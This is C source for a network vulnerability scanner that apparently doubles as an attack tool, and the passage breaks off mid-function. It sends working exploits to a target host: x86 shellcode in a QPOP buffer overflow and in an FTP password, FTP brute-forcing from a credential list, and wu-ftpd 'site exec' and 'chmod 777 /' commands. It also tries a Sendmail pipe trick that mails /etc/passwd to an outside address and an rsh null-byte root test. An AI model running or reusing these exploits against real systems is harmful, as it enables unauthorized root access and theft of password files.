#include "config.h"
#include <stdio.h>
#include <pwd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <string.h>
#include <netdb.h>
#include <signal.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/time.h>
#include <time.h>

#include "PingScan.c"
#include "rule.c"
#include "DetectOS.c"

struct hostent *hp, *gethostbyname();
extern char *optarg;
static char options_string[] = "o:h:b?";
char ftpdata[8048];
char melon[400];
char email[100];
char *os_name;
FILE *result;

void socket_read(int,char *,int);
int connect_to(char *,short);
int resolv(char *,long *);
void die(char *);
void writeto_sock(int, char *);
void writeto_sock2(int, char *);

void brute_foce(char *);
void fingr(char *);
int mksock_strm(int,char *,int);
void smtp_check(char *);
int rshtst(char *);
void pop_check(char *);
void cgiscript(char *);

long addrlist[]={
        0xbfffeee4,             /*2.2*/
        0xbfffec2c              /*2.41beta1*/
};

char shellcode[] =
    "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
    "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
    "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
    "\xff\xff/bin/sh.........";


void get_cons(int ftpcontrl)
{
 	struct sockaddr_in lis_on;
	struct sockaddr_in incoming;
	int lport, sock, i, llength;
	int clisock, bytesrd, ftpdataport, ftpdpx;
	char portcmd[100];
 	fd_set readfds;
 	struct timeval mytime;

 	mytime.tv_sec = 40;
 	mytime.tv_usec = 0;

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0 ) {
		perror("Socket error!");
		exit(1);
	}

 	FD_ZERO(&readfds); 		  
 	FD_SET(sock, &readfds);
	lport = 2000;
	lis_on.sin_family = AF_INET;
	lis_on.sin_port = htons(lport);
	lis_on.sin_addr.s_addr = htonl(INADDR_ANY);
	bzero( &(lis_on.sin_zero), 8);

	if (bind (sock, (struct sockaddr *) &lis_on, sizeof(lis_on) ) < 0)  {
		perror("Bind error!");
		exit(1);
	}

	//listen(sock, 10);

	llength = sizeof(struct sockaddr_in);
	getsockname( sock, (struct sockaddr *) &lis_on, &llength); 
	ftpdataport = ( ntohs(lis_on.sin_port) - ( 256 * (4) ) );
	ftpdataport = (ftpdataport % 256); 
	ftpdpx = (ntohs(lis_on.sin_port) / 256);
	//sprintf(portcmd, "port %s,%d,%d", inet_ntoa(lis_on.sin_addr),
//ftpdpx, ftpdataport);
	
	sprintf(portcmd,"port 161.246.5.26,%d,%d",ftpdpx,ftpdataport);	

//	printf("!!!%s!!!",portcmd);
	for (i = 0; i < strlen(portcmd); i++) {
		if ( (portcmd[i]) == '.')
			portcmd[i] = ',';
	}
    //printf("!!!%s!!!",portcmd);
	writeto_sock(ftpcontrl, portcmd);
	writeto_sock(ftpcontrl,"list"); 	

	listen(sock, 10);
 	select(sock+1, &readfds, (fd_set *) 0, (fd_set *) 0, &mytime);
  	if (FD_ISSET(sock, &readfds)) {
		clisock = accept(sock, (struct sockaddr *) &incoming, &llength);
		
		if (clisock < 0) {
			perror("Incoming socket error! skipping FTP dir.......");
			goto skipgetdata;			
		}
		do { 
			if ( (bytesrd = recv(clisock, ftpdata, sizeof(ftpdata), 0) ) < 0)
				perror("Reading FTP data"); 
		   } while (bytesrd != 0);
		   //puts(ftpdata);
	}
  else {
		puts("Data timed out! Network must be lagged! skipping directory listing......");
		goto skipgetdata;
	}
skipgetdata:
	close(clisock);		
} /* get_cons */

void writeto_sock(int sock, char *putmeout)
{
	int mlen;

	strncpy(melon, "",sizeof(melon) );
	sprintf(melon, putmeout);
	strncat(melon, "\n",1);
	mlen = strlen(melon);
	send(sock, melon, mlen, 0);
}

void writeto_sock2(int sock, char *putmeout)
{
	int mlen;

	strncpy(melon, "",sizeof(melon) );
	sprintf(melon, putmeout);
	mlen = strlen(melon);
	send(sock, melon, mlen, 0);
}

void ftp_check(char *scanhost)
{
	struct sockaddr_in serverto;
	char buf[8024];
	char *chkfnd,*fver;
	char ver[30];
	int rootacc = 0;
	int sock, port=21,i=0;
	fd_set readfds;
	struct timeval mytime;
	FILE *sockin;
	int k,ftp_log=0;

	char    kilamshellcode[] =
	"pass \x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0"
	"\x31\xdb\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b"
	"\x5e\x31\xc0\x31\xc9\x8d\x5e\x01\x88\x46\x04\x66"
	"\xb9\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01"
	"\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89"
	"\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0"
	"\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09"
	"\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe"
	"\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08"
	"\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0"
	"\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8"
	"\x90\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31"
	"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0"
	"\x31\xdb\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b"
	"\x5e\x31\xc0\x31\xc9\x8d\x5e\x01\x88\x46\x04\x66"
	"\xb9\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01"
	"\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89"
	"\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0"
	"\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09"
	"\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe"
	"\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08"
	"\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0"
	"\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8"
	"\x90\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31"
	"\x2e\x2e\x31\x31";
    
	puts("");
	puts("[Checking FTP Server....]");
	puts("");
	fprintf(result,"\n[Checking FTP Server....]\n");
	mytime.tv_sec=40;
	mytime.tv_usec=0;
	strncpy(buf,"",sizeof(buf));

	sock = socket(AF_INET, SOCK_STREAM,0);
	if (sock < 0) {
		perror("Creating socket ERROR!");
		exit(1);
	}
	
	FD_ZERO(&readfds);
	FD_SET(sock,&readfds);
	sockin = fdopen(sock,"r");
	serverto.sin_family = AF_INET;
	serverto.sin_port = htons(port);
	serverto.sin_addr.s_addr = inet_addr(scanhost);

	hp = gethostbyname (scanhost);
	if (hp == NULL)
	{
		herror("DNS error!");
		exit(1);
	}
	bcopy(hp->h_addr, &serverto.sin_addr, hp->h_length);
	
	//printf("%s",inet_ntoa(serverto.sin_addr.s_addr);
	if (connect(sock, (struct sockaddr *) &serverto, sizeof(struct
sockaddr)) < 0)
	{
		puts("No FTP Server found!....");
		fputs("No FTP Server found!....",result);
	}
	if (recv(sock,buf,sizeof(buf),0) < 0)
		perror("receiving data error!");
	else{
		printf("%s\n",buf);
		fprintf(result,"%s\n",buf);
		}


	fver = strstr(buf, "Version");
	while(*(fver+8+i)!= ' ')
	{
	    ver[i]=*(fver+8+i);
		i++;
	}
	ver[i]='\0';
	//printf("!!!%s\n",ver);

	printf("Checking Login with ROOT....\n");
	fprintf(result,"Checking Login with ROOT....\n");
	writeto_sock(sock, "user root");
    if(fgets(buf, sizeof(buf), sockin) != NULL)
	{
		printf("%s",buf);
		chkfnd = strstr(buf,"Password required for root");
			if(chkfnd != NULL) rootacc=1;
				//printf("root access obtainde!!!\n");
			fflush(sockin);
	}
	writeto_sock(sock, kilamshellcode);
    if(fgets(buf, sizeof(buf), sockin) != NULL)
	{
		printf("%s",buf);
		fflush(sockin);
	}
    
	printf("\nTrying Login with Anonymous....\n");
	fprintf(result,"\nTrying Login with Anonymous....\n");
	writeto_sock(sock, "user ftp");
	if(fgets(buf, sizeof(buf), sockin) != NULL)
	{
		printf("%s",buf);
		fprintf(result,"%s",buf);
		chkfnd = strstr(buf,"331 Guest login ok");
			if(chkfnd != NULL) ftp_log=2;
		fflush(sockin);
	}
	if(ftp_log==2){
	writeto_sock(sock, "pass ftp@somewhere.com");
	
	do{
	if(fgets(buf, sizeof(buf), sockin) != NULL)
	{
		printf("%s",buf);
		fprintf(result,"%s",buf);
		chkfnd = strstr(buf,"230");
			if(chkfnd != NULL) ftp_log=1;
		fflush(sockin);
		chkfnd = strstr(buf,"530 Login incorrect.");
			if(chkfnd != NULL) break;
			//if(buf[0]==50) break;
	}}while(strstr(buf,"230-")!=NULL);
	
	if(ftp_log==1){
	
	printf("\nTrying to Write something....\n");
	fprintf(result,"\nTrying to Write something....\n");
	writeto_sock(sock, "pwd");
	writeto_sock(sock, "cwd ~root");
	writeto_sock(sock, "mkd ftptbug");
	writeto_sock(sock, "site chmod 777 /");
	writeto_sock(sock, "mkd homewrt");
	get_cons(sock);
	writeto_sock(sock, "rmd homewrt");
	writeto_sock(sock, "rmd ftptbug");
	
    for(k=0;k<=9;k++){
	if(fgets(buf, sizeof(buf), sockin) != NULL)
	{
		printf("%s",buf);
		fprintf(result,"%s",buf);
		fflush(sockin);
		if(buf=='\0') break;
	}}
    printf("%s\n",ftpdata);
	fprintf(result,"%s\n",ftpdata);

	printf("\nTrying to use SITE EXEC command....\n");
	fprintf(result,"\nTrying to use SITE EXEC command....\n");

	writeto_sock(sock, "site exec bash -c id");
	writeto_sock(sock, "quit");
	
//	printf("%s\n",ftpdata);

	select(sock+1, &readfds, (fd_set *) 0, (fd_set *) 0, &mytime);
	if (FD_ISSET(sock, &readfds)) {
		while (fgets(buf, sizeof(buf), sockin) != NULL)
		{
			printf("%s",buf);
			fprintf(result,"%s",buf);
			chkfnd = strstr(buf,"Password required for root");
			if(chkfnd != NULL) rootacc=1;
				//printf("root access obtainde!!!\n");
			fflush(sockin);
		}
	} else puts("Data Timed out! Network must be lagged!");
	}}

	printf("\n");
	fprintf(result,"\n");
	if(rootacc == 1){
		printf("FTP daemon vulnerable to tilde bug - root access obtained!\n");
		fprintf(result,"FTP daemon vulnerable to tilde bug - root access obtained!\n");
		}
	chkfnd = strstr(ftpdata, "homewrt");
	if (chkfnd != NULL){
		printf("FTP Server vulnerable - home directory writeable to all!\n");
		fprintf(result,"FTP Server vulnerable - home directory writeable to all!\n");
		}
	chkfnd = strstr(ftpdata, "uid=0(root)");
	if (chkfnd != NULL){
		printf("FTP Server has site EXEC bug - root obtainde!\n");
		fprintf(result,"FTP Server has site EXEC bug - root obtainde!\n");
		}
	
	close(sock);
	rules(21,os_name,ver,result);
	puts("");

}

void usage(char *argv[])
{
	printf("Usage: %s [option] <Target Host>\n", argv[0]);
	printf("Option:\n");
	printf("\t-h\tHost name or IP\n");
	printf("\t-b\tPerform Brute Fouce operation\n");
	printf("\t-o\tOutput file (default isagnet.result)\n");
	exit(1);
}
 
int main(int argc, char *argv[])
{
	int co;
	char scanhost[200]="";
	char outfile[20];
	int brute_f = 0;
	//char *os_name;

	strcpy(outfile,"isagnet.result");

	if (argc == 1)
		usage(argv);
	while((co = getopt(argc,argv,options_string)) !=EOF)
	{
		switch(tolower(co))
		{
			case 'h' :
				strcpy(scanhost,optarg);
				break;
			case 'b' :
				brute_f = 1;
				break;
			case 'o' :
				strcpy(outfile,optarg);
				break;
			case '?' :
				usage(argv);
				break;
			default : usage(argv);
		}
	}
	if(scanhost=="")
		usage(argv);

 	result=fopen(outfile,"w");
	if(result==NULL)
		printf("\n!!!Can't generate out put file!!!\n");
		
    ping_host(scanhost,result);   
	
	scanport(hostname);
	
	os_name = os_scan(scanhost,result);
	
	rules(0,os_name,'\0',result);
	getchar();
	if(brute_f==1){
		brute_foce(scanhost);
		getchar();
		}

	smtp_check(scanhost);
	getchar();
	ftp_check(scanhost);
	getchar();
	rshtst(scanhost);
	getchar();
	pop_check(scanhost);
	getchar();
	fingr(scanhost);
	getchar();
	cgiscript(scanhost);
	getchar();
	fclose(result);
}

void brute_foce(char *scanhost)
{
	int sock;
	int len=0;
	int total=0;
	char buf[500];
	char user[50];
	char username[25];
	char passwd[25];
	char *p;
	char tempc;
	fpos_t fpos;
	fd_set readfds;
	struct timeval mytime;
	FILE *sockin,*fb;
	
	puts("");
	puts("[Brute Force operation....]");
	puts("");
	fprintf(result,"\n[Brute Force operation....]\n");
	if((fb = fopen("/usr/local/bin/isagnet-conf/Brute.conf","r"))==NULL)
	{
		printf("Can't find Brute.conf file skip Brute force operation!");
		fprintf(result,"Can't find Brute.conf file skip Brute force operation!");
		goto skipBrute;
	}

	mytime.tv_sec = 40;
	mytime.tv_usec = 0;
	strncpy(buf,"",sizeof(buf));
	
	do{
	sock = mksock_strm(21, scanhost,0);
	if (sock <0) {
		puts("Can't Connect to Server...........");
		goto skipBrute;
	}
	FD_ZERO(&readfds);
	FD_SET(sock, &readfds);
	sockin = fdopen(sock,"r");
	fgets(buf,sizeof(buf),sockin);
	fsetpos(fb,&fpos);
	fgets(user,sizeof(user),fb);
	fgetpos(fb,&fpos);
	len=strlen(user);
	user[len-2]='\0';
	p = strtok(user,":");
	strcpy(username,p);
	p = strtok(NULL,":");
	strcpy(passwd,p);
	writeto_sock2(sock,"user ");
	writeto_sock(sock,username);
	printf("Username: %s Password: %s \r",username,passwd);
		if(fgets(buf,sizeof(buf),sockin) != NULL)
		{   //puts(buf);
			if(strstr(buf,"331")!=NULL)
			{
				writeto_sock2(sock,"pass ");
				writeto_sock(sock,passwd);
				if(fgets(buf,sizeof(buf),sockin) != NULL)
				{	//puts(buf);
					if(strstr(buf,"230")!=NULL)
					{
						printf("Username: %s  Password: %s  Can Login to Server!!! \n",username,passwd);
						fprintf(result,"Username: %s  Password: %s  Can Login to Server!!! \n",username,passwd);
						total++;
					}
				} 
			}
		}
	
	writeto_sock(sock, "quit");

	select(sock+1, &readfds, (fd_set *) 0,(fd_set *) 0, &mytime);

	if(FD_ISSET(sock, &readfds)) {
	while(fgets(buf, sizeof(buf), sockin) != NULL)
		{
			fflush(sockin);
		}
	}
		else {
			puts("Data Timed out! Network must be lagged!");
		}
	}while(fgetc(fb) != EOF);
	
	printf("\nFound %d users can login to this server\n",total);
	fprintf(result,"\nFound %d users can login to this server\n",total);

	skipBrute:
		puts("");
		close(sock);
		fclose(fb);
}


void fingr(char *scanhost)
{
	int sock;
	char buf[20048];
	fd_set readfds;
	struct timeval mytime;
	FILE *sockin;

	puts("[Checking finger server....]");
	puts("");

	fprintf(result,"\n[Checking finger server....]\n");

	mytime.tv_sec = 40;
	mytime.tv_usec = 0;
	strncpy(buf,"",sizeof(buf));
	
	sock = mksock_strm(79, scanhost,0);
	if (sock <0) {
		puts("No finger server found! skipping finger...........");
		fprintf(result,"\nNo finger server found! skipping finger...........\n");
		goto skipfinger;
	}

	FD_ZERO(&readfds);
	FD_SET(sock, &readfds);
	sockin = fdopen(sock,"r");
	writeto_sock(sock, "1234\n");

	select(sock+1, &readfds, (fd_set *) 0,(fd_set *) 0, &mytime);
	if(FD_ISSET(sock, &readfds)) {
		while (fgets(buf, sizeof(buf), sockin) != NULL)
		{
			printf("%s",buf);
			fprintf(result,"\n%s",buf);
			fflush(sockin);
		}
	}
		else {
			puts("Data Timed out! Network must be lagged!");
		}
	skipfinger:
		puts("");
		close(sock);
}

int mksock_strm(int gport, char *scanhost, int ourport)
{

	struct sockaddr_in sockglob, myaddr2;
	int gsk;

	if (ourport !=2) {
		gsk = socket(AF_INET, SOCK_STREAM, 0);
		if (gsk < 0) {
			perror("Creating socket!");
			exit(1);
		}

		myaddr2.sin_family = AF_INET;
		myaddr2.sin_addr.s_addr = INADDR_ANY;
		myaddr2.sin_port = htons(ourport);

		if (bind(gsk, (struct sockaddr *) &myaddr2,sizeof(myaddr2))<0)
		{
			perror("bind error");
		}
	}
	
	if(ourport == 2) {
		gport = IPPORT_RESERVED -1;
		gsk = rresvport(&gport);
	}

	sockglob.sin_family = AF_INET;
	sockglob.sin_port = htons(gport);
	sockglob.sin_addr.s_addr = inet_addr(scanhost);

	hp = gethostbyname(scanhost);
	if(hp==NULL) {
		perror("DNS error!");
		exit(1);
	}

	bcopy(hp->h_addr, &sockglob.sin_addr, hp->h_length);
	if (connect(gsk, (struct sockaddr *) &sockglob, sizeof(struct sockaddr) ) <0)
	{
		gsk = -1;
	}
	return(gsk);
}

void smtp_check(char *scanhost)
{
	struct sockaddr_in serverto;
	struct timeval mytime;
	fd_set readfds;
	char buf[1024];
	char ver[20];
	char sver[200];
	char *our_email;
	char *fver, *chkfnd;
	int verno=10; 
	int sock, port=25, gotdecode=0, gotuudecode=0,gotdbmail=0;
	int gotgrabpw = 0, gotwiz = 0, gotdebug = 0,gotedebug=0,gotstaff=0;
	int i=0;
	FILE *sockin;

	puts("[Checking Sendmail....]");
	puts("");
	fprintf(result,"\n[Checking Sendmail....]\n");

	mytime.tv_sec = 40;
	mytime.tv_usec = 0;
	strncpy(sver,"",sizeof(sver));
	strncpy(buf,"",sizeof(buf));

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		perror("Creating socket!");
		exit(1);
	}

	FD_ZERO(&readfds);
	FD_SET(sock, &readfds);

	serverto.sin_family = AF_INET;
	serverto.sin_port = htons(port);
	serverto.sin_addr.s_addr = inet_addr(scanhost);

	hp = gethostbyname(scanhost);
	if (hp == NULL) {
		herror("DNS error!");
		exit(1);
	}
	bcopy(hp->h_addr, &serverto.sin_addr,hp->h_length);

	if(connect(sock, (struct sockaddr *) &serverto,sizeof(struct sockaddr) ) < 0)
	{
		puts("No mail server! skipping SMTP checks.............");
		fprintf(result,"No mail server! skipping SMTP checks.............\n");
		goto skipmail;
	}
	if(recv(sock, sver,sizeof(sver),0) < 0)
		perror("receiving data error!");
	sockin = fdopen(sock,"r");

	strncpy(buf,sver, sizeof(sver));
	fver = strstr(sver, "Sendmail");
	//printf("!!!%s\n",fver);
	if (fver != NULL) {
		verno = (*(fver+9) - '0');
		}
	while(*(fver+9+i)!= ';')
	{
	    ver[i]=*(fver+9+i);
		i++;
	}
	ver[i]='\0';

	//printf("%s", sver);
	printf("\nChecking EXPN decode....\n");
	fprintf(result,"\nChecking EXPN decode....\n");

	writeto_sock(sock, "EXPN decode");
	if(fgets(buf,sizeof(buf), sockin) != NULL)
	{
		puts(buf);
		fputs(buf,result);
		chkfnd = strstr(buf, "decode@");
			if(chkfnd !=NULL) {
				gotdecode =1;
				chkfnd=NULL;}
	}

	printf("Checking EXPN uudecode....\n");
	fprintf(result,"\nChecking EXPN uudecode....\n");

	writeto_sock(sock, "EXPN uudecode");
    if(fgets(buf,sizeof(buf), sockin) != NULL)
	{
		puts(buf);
		fputs(buf,result);
		chkfnd = strstr(buf, "550");
			if(chkfnd ==NULL) {
				gotuudecode =1;
				chkfnd=NULL;}
	}
	printf("Checking EXPN staff....\n");
	fprintf(result,"\nChecking EXPN staff....\n");

	writeto_sock(sock, "EXPN staff");
   if(fgets(buf,sizeof(buf), sockin) != NULL)
	{
		puts(buf);
		fputs(buf,result);
		chkfnd = strstr(buf, "550");
			if(chkfnd ==NULL) {
				gotstaff =1;
				chkfnd=NULL;}
	}
	printf("Checking EXPN debug....\n");
	fprintf(result,"\nChecking EXPN debug....\n");

	writeto_sock(sock, "EXPN debug");
    if(fgets(buf,sizeof(buf), sockin) != NULL)
	{
		puts(buf);
		fputs(buf,result);
		chkfnd = strstr(buf, "550");
			if(chkfnd !=NULL) {
				gotedebug =1;
				chkfnd=NULL;}
	}
	printf("Checking EXPN wiz....\n");
	fprintf(result,"\nChecking EXPN wiz....\n");

	writeto_sock(sock, "EXPN wiz");
	if(fgets(buf,sizeof(buf), sockin) != NULL)
	{
		puts(buf);
		fputs(buf,result);
		/*chkfnd = strstr(buf, "decode@");
			if(chkfnd !=NULL) {
				gotdecode =1;
				chkfnd=NULL;}*/
	}
	printf("Checking WIZ Command....\n");
	fprintf(result,"\nChecking WIZ Command....\n");

    writeto_sock(sock, "wiz");
	if(fgets(buf,sizeof(buf), sockin) != NULL)
	{
		puts(buf);
		fputs(buf,result);
		chkfnd = strstr(buf, "mighty wizard");
			if (chkfnd != NULL) {
				gotwiz=1;
				chkfnd = NULL;
			}
	}
	printf("Checking DEBUG Command....\n");
	fprintf(result,"\nChecking DEBUG Command....\n");

    writeto_sock(sock, "debug");
   if(fgets(buf,sizeof(buf), sockin) != NULL)
	{
		puts(buf);
		fputs(buf,result);
		chkfnd = strstr(buf, "Debug set");
			if (chkfnd != NULL) {
				gotdebug = 1;
				chkfnd=NULL;
			}
	}
       // writeto_sock(sock, "showq");
    //    printf("!!!!!!!!!!!verno = %d!!!!!!!!!!",verno);
	if(verno < 6)
	{
		printf("Checking for the double mail hack....\n");
		fprintf(result,"\nChecking for the double mail hack....\n");
		writeto_sock(sock, "rcpt to: /tmp/dbl_mail");
		writeto_sock(sock, "mail from: someone");
		writeto_sock(sock, "data");
		writeto_sock(sock, "test test test!");
		writeto_sock(sock, ".");
		writeto_sock(sock, "rcpt to: /tmp/dbl_mail");
		writeto_sock(sock, "mail from: someone");
		writeto_sock(sock, "data");
		writeto_sock(sock, "+ +");
		writeto_sock(sock, ".");
	}

	if (verno < 6)
	{
		printf("Checking for the password file can be grabbed via smtp....\n");
		fprintf(result,"\nChecking for the password file can be grabbed via smtp....\n");
		our_email = "someone@somewhere.com";
		sprintf(email, "mail from: \"|/bin/mail %s < /etc/passwd\"",our_email);
		writeto_sock(sock, email);
		writeto_sock(sock, "rcpt to: someone");
		writeto_sock(sock, "data");
		writeto_sock(sock, ".");
	}
	writeto_sock(sock, "quit");

	select(sock+1, &readfds, (fd_set *) 0,(fd_set *) 0, &mytime);

	if(FD_ISSET(sock, &readfds)){
		//printf("%s", sver);
		while (fgets(buf,sizeof(buf), sockin) != NULL)
		{
			chkfnd = strstr(buf, "/passwd\"... Sender ok");
			if (chkfnd != NULL) {
				gotgrabpw = 1;
				chkfnd=NULL;
			}
			chkfnd = strstr(buf, "Recipient ok");
			if (chkfnd!=NULL) {
				gotdbmail = 1;
				chkfnd = NULL;
			}
			printf("%s", buf);
			fflush(sockin);
		}
	}else {
		puts("Data Timed out! Network must be lagged!");
		}
	//skipmail:
		printf("\n");
		if(gotdecode == 1) {
			printf("\n=== Description ===\n\t");
			puts("Danger! [DECODE] alias present!");
			printf("\n=== How To Fix ===\n\t");
			puts("Add Oprivacy=noexpn  in sendmail.cf and restart service");
			fprintf(result,"\n=== Description ===");
			fprintf(result,"\n\tDanger! [DECODE] alias present!");
			fprintf(result,"\n=== How To Fix ===\n\t");
			fputs("Add Oprivacy=noexpn  in sendmail.cf and restart service",result);
			gotdecode = 0;
		}
		if(gotwiz == 1) {
			printf("\n=== Description ===\n\t");
			puts("Danger! [WIZ] command accepted!");
			fprintf(result,"\nDanger! [WIZ] command accepted!\n");
			gotwiz=0;
		}
		if(gotdebug == 1) {
			printf("\n=== Description ===\n\t");
			puts("Danger! [DEBUG] command accepted!");
			fprintf(result,"\nDanger! [DEBUG] command accepted!\n");
			gotdebug = 0;
		}
		if(gotgrabpw == 1) {
			printf("\n=== Description ===\n\t");
			puts("Danger! Sendmail allows password file to be grabbed!");
			fprintf(result,"\nDanger! Sendmail allows password file to be grabbed!\n");
			gotgrabpw=0;
		}
		if (gotdbmail == 1) {
			printf("\n=== Description ===\n\t");
			puts("Danger! Sendmail will mail to files (double mailing bug present)!");
			fprintf(result,"\nDanger! Sendmail will mail to files (double mailing bug present)!\n");
			gotdbmail=0;
		}
		//rule_file(25,verno);
		skipmail:
		close(sock);
		unlink("/tmp/dbl_mail");
/*******************************/
	    rules(25,os_name,ver,result);
/*******************************/
		puts("");
}


int rshtst(char *scanhost)
{
	int sock;
	int lpport;
	char buf[2048];
	char *chkfnd;
	char c; /* 1 from server char */
	struct sockaddr_in servaddr;
	fd_set readfds;
 	struct timeval mytime;
 	FILE *sockin;

	puts("[Checking RSH for NULL bug server....]");
	puts("");
	fprintf(result,"\n[Checking RSH for NULL bug server....]\n");

 	mytime.tv_sec = 40; 		/* 40 second wait MAX */
 	mytime.tv_usec = 0;

	if ( (getuid() != 0) || (geteuid() != 0 ) ) {
		puts("Need root on local system! skipping RSH test...............");
		fprintf(result,"Need root on local system! skipping RSH test...............");
		goto skiprsh;
	}
	strncpy(buf, "", sizeof(buf));
	lpport = IPPORT_RESERVED - 1;
	sock = rresvport(&lpport);

/* This function makes a AF_INET stream socket() and bind() a port < 1023 
 * It requires root (on UNIX) ! 
 */
  	hp = gethostbyname(scanhost);
  	if (hp == NULL) {
  		herror("DNS error!");
  		exit(1);
  	}
 	bcopy(hp->h_addr, &servaddr.sin_addr, hp->h_length);  
	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons(514); 

	if ( connect(sock, (struct sockaddr *) &servaddr, sizeof(struct sockaddr) ) <0 )
	{
		puts("No RSH server found! skipping RSHD checks...............");
		fprintf(result,"No RSH server found! skipping RSHD checks...............\n");
		goto skiprsh;
	}

	write(sock, "", 1);      	/* The silly null byte is sent 	*/	
	write(sock, "root", 5);    	/* Me-  3 bytes or root 5b	*/
	write(sock, "", 1); 	 	/* EXEC cmd as "user" 5 byte	*/
/*	write(sock, "\0im\0im\0echo + + >>~/.rhosts\0", 28); 		*/
	
	write(sock, "id", 3); 
	read(sock, &c, 1); /* take the null byte we get from server into c */	

 	FD_ZERO(&readfds); 		/* clear the read */  
 	FD_SET(sock, &readfds);
 	sockin = fdopen(sock, "r"); 	/* make it into an I/O stream */
	select(sock+1, &readfds, (fd_set *) 0, (fd_set *) 0, &mytime);
  	if (FD_ISSET(sock, &readfds)) {
  		while (fgets(buf, sizeof(buf), sockin) != NULL)
  		{
  			printf("%s", buf);
			fprintf(result,"%s", buf);
  			fflush(sockin);
  		}
  	}
  else {
  		puts("Data Timed out! Network must be lagged!");
		fprintf(result,"Data Timed out! Network must be lagged!\n");
  	}

	close(sock);	/* Do not move this line */
skiprsh:
  	chkfnd = strstr( buf, "uid=0(root)");
	if (chkfnd != NULL) {
		printf("**RSH server has NULL argument bug - root access obtained!\n");
		fprintf(result,"**RSH server has NULL argument bug - root access obtained!\n");
	}
	puts("");
}

/***********************/
/******qpop scan********/
/***********************/
void die(char *s) {
        if (errno) perror(s);
        else fprintf(stderr,"%s\n",s);
        exit(-1);
}

int resolv(char *host,long *ipaddr) {
        if (isdigit(host[0])) {
                *ipaddr=inet_addr(host);
                if (*ipaddr==-1) return -1;
        }
        else {
                struct hostent *hp;
                if ((hp=gethostbyname(host))==NULL) {
                        fprintf(stderr,"tc: %s: unknown host\n");
                        exit(-1);
                }
                *ipaddr=*(unsigned long *)hp->h_addr;
        }
        return 0;
}

int connect_to(char *hostname,short port) {
struct sockaddr_in s_in;
int s;

        s=socket(PF_INET,SOCK_STREAM,0);
        if (s==-1) die("socket");

        if (resolv(hostname,(long *)&s_in.sin_addr.s_addr)==-1)
                die("unknown host");
        s_in.sin_family=AF_INET;
        s_in.sin_port=htons(port);

        if (connect(s,(struct sockaddr *)&s_in,sizeof(s_in))==-1)
                //die("connect");
				s=-1;

        return s;
}

void socket_read(int s,char *buf,int len) {
int i;
        switch(i=read(s,buf,len)) {
        case -1: die("unexpected EOF");
        case  0: die("EOF");
        default:
                buf[i]=0;
                //printf("%s",buf);
                break;
        }
}

void pop_check(char *scanhost) {
char buf[1024+128];
char *fver,*chkfnd,ver[10]="";
int s,i,ix;
		ix=0;
		puts("[Checking POP3 server....]");
		fprintf(result,"\n[Checking POP3 server....]\n");

        s=connect_to(scanhost,110);      /* WKS POP3 */
		if(s<0)
		{
			puts("\nNo POP3 server found! skipping POP3 checks...............\n");
			fputs("\nNo POP3 server found! skipping POP3 checks...............\n",result);
			goto skippop;
		}
        socket_read(s,buf,sizeof(buf));
		puts(buf);
		i=0;

	fver = strstr(buf, "POP3");
	if(fver	!= NULL)
	{
		if((*(fver+5) < '9')&&(*(fver+5) > '0'))
	{
		while(*(fver+5+i)!= ' ')
			{
				ver[i]=*(fver+5+i);
				i++;
			}
			ver[i]='\0';
	}}
	
	fver=strstr(buf," v");
	if(fver!=NULL){
		while(*(fver+1+i)!= ' ')
			{
				ver[i]=*(fver+1+i);
				i++;
			}
			ver[i]='\0';
	}
	
	fver = strstr(buf,"Version");
	if(fver!=NULL){
		while(*(fver+8+i)!= ')')
			{
				ver[i]=*(fver+8+i);
				i++;
			}
			ver[i]='\0';
	} 

		//puts("!!!!!!!!!");
		//puts(ver);
		if(strstr(ver,"2.4")!=NULL)	ix=1;	

		puts("Trying to uses QPOP buffer overflow exploit....");
		fputs("Trying to uses QPOP buffer overflow exploit....",result);
        memset(buf,0x90,sizeof(buf));
        for (i=981;i<981+10*4;i+=4)
                memcpy(&buf[i],&addrlist[ix],4);
        memcpy(&buf[941],shellcode,strlen(shellcode));
        buf[sizeof(buf)-3]=0x0d;
        buf[sizeof(buf)-2]=0x0a;
        buf[sizeof(buf)-1]=0x00;
        write(s,buf,sizeof(buf));
        socket_read(s,buf,sizeof(buf));
		puts(buf);
		chkfnd = strstr( buf, "-OK");
		if (chkfnd != NULL) {
			puts("POP3 server contains a buffer overflow that allows authenticated users to execute arbitrary.");
